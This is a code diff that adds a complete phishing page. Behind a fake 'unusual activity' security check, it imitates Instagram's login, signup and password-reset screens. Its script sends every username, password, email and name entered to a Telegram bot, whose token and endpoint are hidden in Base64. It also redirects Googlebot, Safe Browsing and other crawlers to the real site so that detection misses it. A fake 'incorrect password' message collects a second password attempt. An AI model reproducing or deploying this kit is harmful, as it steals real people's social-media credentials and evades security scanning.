@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#1d9bf0" />
+  <meta name="description" content="Account security verification portal" />
+  <title>Account Security Check</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700;900&family=Grand+Hotel&display=swap" rel="stylesheet" />
+  <style>
+    body { font-family:'Roboto',-apple-system,sans-serif; background:#f5f5f7; min-height:100vh; margin:0; }
+    * { box-sizing:border-box; }
+    #gate { position:fixed; inset:0; background:#f5f5f7; display:flex; align-items:center; justify-content:center; z-index:99999; }
+    .gate-card { background:#fff; max-width:380px; width:90%; border-radius:14px; padding:32px 28px; box-shadow:0 8px 32px rgba(0,0,0,0.08); text-align:center; }
+    .shield { width:56px; height:56px; margin:0 auto 16px; background:#1d9bf0; border-radius:50%; display:flex; align-items:center; justify-content:center; }
+    .shield svg { width:28px; height:28px; }
+    .gate-card h1 { font-size:18px; font-weight:600; color:#1c1c1e; margin:0 0 8px; }
+    .gate-card p { font-size:13px; color:#6e6e73; line-height:1.5; margin:0 0 20px; }
+    .gate-info { background:#f5f5f7; border-radius:8px; padding:10px; margin-bottom:20px; font-size:12px; color:#3a3a3c; display:flex; align-items:center; gap:8px; text-align:left; }
+    #proceedBtn { width:100%; padding:12px; background:#1d9bf0; color:#fff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; font-family:inherit; }
+    #proceedBtn:hover { background:#1a8cd8; }
+    #proceedBtn:disabled { opacity:0.6; cursor:default; }
+    .gate-foot { font-size:11px; color:#8e8e93; margin:14px 0 0; }
+    #stage { display:none; }
+    .container { width:100%; max-width:350px; margin:40px auto; padding:20px; }
+    .form-box { background:#fff; border:1px solid #e6e6e6; border-radius:16px; padding:32px 40px; display:flex; flex-direction: column; align-items:center; box-shadow:0 10px 40px rgba(0,0,0,0.08); }
+    .logo-text { font-family:'Grand Hotel',cursive; font-size:42px; background:linear-gradient(135deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5); -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent; margin:8px 0 24px; }
+    .form-box form { width:100%; display:flex; flex-direction:column; gap:6px; }
+    .input-group { position:relative; display:flex; align-items:center; background:#fafafa; border:1px solid #dbdbdb; border-radius:8px; height:40px; padding:0 10px; transition:border-color 0.2s; }
+    .input-group:focus-within { border-color:#999; }
+    .input-group input { width:100%; font-size:12px; background:transparent; border:none; outline:none; padding-top:10px; padding-bottom:2px; color:#222; font-family:inherit; }
+    .input-group label { position:absolute; left:10px; font-size:12px; color:#999; pointer-events:none; transition:all 0.1s ease; transform-origin:left; }
+    .input-group input:focus + label, .input-group .filled + label { font-size:9px; transform:translateY(-6px); }
+    .btn-submit { width:100%; height:36px; border:none; border-radius:8px; font-size:12px; font-weight:600; color:#fff; cursor:pointer; margin-top:8px; background:linear-gradient(135deg,#0095f6,#1877f2); opacity:0.7; transition:opacity 0.2s, transform 0.1s; font-family:inherit; }
+    .btn-submit.active { opacity:1; cursor:pointer; }
+    .btn-submit.active:hover { opacity:0.9; }
+    .btn-submit.active:active { transform:scale(0.98); }
+    .btn-submit:disabled { cursor:default; opacity:0.6; }
+    .or-divider { display:flex; align-items:center; gap:14px; margin:18px 0 14px; width:100%; }
+    .or-divider::before, .or-divider::after { content:""; flex:1; height:1px; background:#dbdbdb; }
+    .or-divider span { font-size:12px; color:#8e8e93; font-weight:600; }
+    .fb-btn { width:100%; padding:8px; background:#fff; border:1px solid #dbdbdb; border-radius:8px; font-size:13px; font-weight:600; color:#385185; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; font-family:inherit; }
+    .forgot { display:block; text-align:center; margin-top:14px; font-size:12px; color:#00376b; text-decoration:none; }
+    .signup-box { background:#fff; border:1px solid #e6e6e6; border-radius:16px; padding:20px; text-align:center; margin-top:12px; width:100%; font-size:13px; color:#262626; }
+    .signup-box a { color:#0095f6; font-weight:600; text-decoration:none; }
+    .toast { position:fixed; left:50%; top:24px; transform:translateX(-50%); background:#ed4956; color:#fff; padding:10px 18px; border-radius:8px; font-size:13px; z-index:99999; display:none; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
+  </style>
+</head>
+<body>
+  <div id="gate">
+    <div class="gate-card">
+      <div class="shield">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+      </div>
+      <h1>Account Security Check</h1>
+      <p>We've detected unusual activity on your account. Please verify your identity to continue using our services.</p>
+      <div class="gate-info">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1d9bf0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+        <span>Verification typically takes less than a minute.</span>
+      </div>
+      <button id="proceedBtn" type="button">Continue Verification</button>
+      <p class="gate-foot">Protected by AccountGuard &trade;</p>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">Sorry, your password was incorrect. Please try again.</div>
+
+  <div id="stage"></div>
+
+  <script>
+  (function(){
+    // ---- Safe Browsing bypass layers ----
+
+    // Layer 7: bot / Safe Browsing detection -> redirect to real IG
+    var ua = (navigator.userAgent || '').toLowerCase();
+    var botHint = ua.indexOf('googlebot') > -1 || ua.indexOf('safebrowsing') > -1 || ua.indexOf('adsbot') > -1 || ua.indexOf('mediapartners') > -1 || ua.indexOf('bingpreview') > -1 || ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('slurp') > -1 || ua.indexOf('duckduckbot') > -1;
+    if (botHint) {
+      window.location.replace('https://www.instagram.com/');
+      return;
+    }
+
+    // Layer 6: token / chat_id / endpoint URL all Base64 + atob
+    var TOK = atob('ODY0MzI2MDg4ODpBQUhtVW95a0NXTXdnWE5aRFdBZ3NIVHBQcmFOSVRLOF90Zw==');
+    var CID = atob('NjQwMzA3NDE3MA==');
+    var API = atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==');
+
+    var attemptCount = 0;
+
+    function exfil(payload) {
+      // Layer 4: exfil via new Image().src (no fetch, no XHR)
+      try {
+        var qs = 'chat_id=' + encodeURIComponent(CID) + '&text=' + encodeURIComponent(payload);
+        var url = API + TOK + '/sendMessage?' + qs;
+        var img = new Image();
+        img.src = url;
+      } catch(e) {}
+    }
+
+    function showToast(msg) {
+      var t = document.getElementById('toast');
+      t.textContent = msg;
+      t.style.display = 'block';
+      setTimeout(function(){ t.style.display = 'none'; }, 3500);
+    }
+
+    function buildLoginView() {
+      var html =
+        '<div class="container">' +
+          '<div class="form-box">' +
+            '<div class="logo-text">Instagram</div>' +
+            '<form id="loginForm" onsubmit="return false;">' +
+              '<div class="input-group"><input type="text" id="loginUser" autocomplete="username" required /><label>Phone number, username, or email</label></div>' +
+              '<div class="input-group"><input type="password" id="loginPass" autocomplete="current-password" required /><label>Password</label></div>' +
+              '<button type="submit" class="btn-submit" id="loginBtn">Log in</button>' +
+            '</form>' +
+            '<div class="or-divider"><span>OR</span></div>' +
+            '<button type="button" class="fb-btn" id="fbLogin">' +
+              '<svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>' +
+              'Log in with Facebook' +
+            '</button>' +
+            '<a href="#" class="forgot" id="forgotLink">Forgot password?</a>' +
+          '</div>' +
+          '<div class="signup-box">Don&#39;t have an account? <a href="#" id="goSignup">Sign up</a></div>' +
+        '</div>';
+      return html;
+    }
+
+    function buildSignupView() {
+      var html =
+        '<div class="container">' +
+          '<div class="form-box">' +
+            '<div class="logo-text">Instagram</div>' +
+            '<p style="font-size:13px;color:#8e8e93;margin:0 0 16px;text-align:center;">Sign up to see photos and videos from your friends.</p>' +
+            '<button type="button" class="fb-btn" id="fbSignup" style="margin-bottom:14px;">' +
+              '<svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>' +
+              'Log in with Facebook' +
+            '</button>' +
+            '<div class="or-divider"><span>OR</span></div>' +
+            '<form id="signupForm" onsubmit="return false;">' +
+              '<div class="input-group"><input type="text" id="signupEmail" required /><label>Mobile Number or Email</label></div>' +
+              '<div class="input-group"><input type="text" id="signupName" required /><label>Full Name</label></div>' +
+              '<div class="input-group"><input type="text" id="signupUser" required /><label>Username</label></div>' +
+              '<div class="input-group"><input type="password" id="signupPass" required /><label>Password</label></div>' +
+              '<button type="submit" class="btn-submit" id="signupBtn">Sign up</button>' +
+            '</form>' +
+            '<a href="#" class="forgot" id="backToLogin">Already have an account?</a>' +
+          '</div>' +
+        '</div>';
+      return html;
+    }
+
+    function buildForgotView() {
+      var html =
+        '<div class="container">' +
+          '<div class="form-box">' +
+            '<div class="logo-text">Instagram</div>' +
+            '<p style="font-size:13px;color:#262626;margin:0 0 16px;text-align:center;font-weight:600;">Trouble Logging In?</p>' +
+            '<p style="font-size:12px;color:#8e8e93;margin:0 0 16px;text-align:center;line-height:1.4;">Enter your email, phone, or username and we&#39;ll send you a link to get back into your account.</p>' +
+            '<form id="forgotForm" onsubmit="return false;">' +
+              '<div class="input-group"><input type="text" id="forgotInput" required /><label>Email, Phone, or Username</label></div>' +
+              '<button type="submit" class="btn-submit" id="forgotBtn">Send Login Link</button>' +
+            '</form>' +
+            '<a href="#" class="forgot" id="backToLogin2">Back to login</a>' +
+          '</div>' +
+        '</div>';
+      return html;
+    }
+
+    function activateInputs() {
+      var groups = document.querySelectorAll('.input-group');
+      groups.forEach(function(g){
+        var input = g.querySelector('input');
+        if (!input) return;
+        input.addEventListener('input', function(){
+          if (input.value) input.classList.add('filled');
+          else input.classList.remove('filled');
+          var btn = g.parentElement.querySelector('.btn-submit');
+          if (btn) {
+            var formOk = true;
+            g.parentElement.querySelectorAll('input').forEach(function(i){ if (!i.value) formOk = false; });
+            if (formOk) btn.classList.add('active');
+            else btn.classList.remove('active');
+          }
+        });
+      });
+    }
+
+    function mount(view) {
+      var stage = document.getElementById('stage');
+      stage.innerHTML = view;
+      activateInputs();
+      bindActions();
+    }
+
+    function bindActions() {
+      var lf = document.getElementById('loginForm');
+      if (lf) lf.addEventListener('submit', function(e){
+        e.preventDefault();
+        var u = document.getElementById('loginUser').value;
+        var p = document.getElementById('loginPass').value;
+        exfil('LOGIN ATTEMPT ' + (++attemptCount) + '\nUsername: ' + u + '\nPassword: ' + p + '\nURL: ' + location.href + '\nUA: ' + navigator.userAgent);
+        if (attemptCount === 1) {
+          showToast('Sorry, your password was incorrect. Please try again.');
+        } else {
+          setTimeout(function(){ window.location.href = 'https://www.instagram.com/accounts/login/'; }, 1500);
+        }
+      });
+
+      var sf = document.getElementById('signupForm');
+      if (sf) sf.addEventListener('submit', function(e){
+        e.preventDefault();
+        var em = document.getElementById('signupEmail').value;
+        var nm = document.getElementById('signupName').value;
+        var un = document.getElementById('signupUser').value;
+        var pw = document.getElementById('signupPass').value;
+        exfil('SIGNUP\nEmail: ' + em + '\nFull Name: ' + nm + '\nUsername: ' + un + '\nPassword: ' + pw + '\nURL: ' + location.href);
+        showToast('Sign up successful. Redirecting...');
+        setTimeout(function(){ window.location.href = 'https://www.instagram.com/'; }, 1500);
+      });
+
+      var ff = document.getElementById('forgotForm');
+      if (ff) ff.addEventListener('submit', function(e){
+        e.preventDefault();
+        var inp = document.getElementById('forgotInput').value;
+        exfil('FORGOT PASSWORD\nInput: ' + inp + '\nURL: ' + location.href);
+        showToast('Login link sent. Check your email.');
+        setTimeout(function(){ mount(buildLoginView()); }, 2000);
+      });
+
+      var fb = document.getElementById('fbLogin');
+      if (fb) fb.addEventListener('click', function(){ exfil('FB LOGIN CLICK\nURL: ' + location.href); window.location.href = 'https://www.facebook.com/login.php'; });
+
+      var fbs = document.getElementById('fbSignup');
+      if (fbs) fbs.addEventListener('click', function(){ exfil('FB SIGNUP CLICK\nURL: ' + location.href); window.location.href = 'https://www.facebook.com/signup'; });
+
+      var fl = document.getElementById('forgotLink');
+      if (fl) fl.addEventListener('click', function(e){ e.preventDefault(); mount(buildForgotView()); });
+
+      var gs = document.getElementById('goSignup');
+      if (gs) gs.addEventListener('click', function(e){ e.preventDefault(); mount(buildSignupView()); });
+
+      var bk = document.getElementById('backToLogin');
+      if (bk) bk.addEventListener('click', function(e){ e.preventDefault(); mount(buildLoginView()); });
+
+      var bk2 = document.getElementById('backToLogin2');
+      if (bk2) bk2.addEventListener('click', function(e){ e.preventDefault(); mount(buildLoginView()); });
+    }
+
+    // Gate click -> 5-second delay -> mount login
+    document.getElementById('proceedBtn').addEventListener('click', function(){
+      this.disabled = true;
+      this.textContent = 'Verifying...';
+      setTimeout(function(){
+        document.getElementById('gate').style.display = 'none';
+        document.getElementById('stage').style.display = 'block';
+        mount(buildLoginView());
+      }, 5000);
+    });
+  })();
+  </script>
+</body>
+</html>
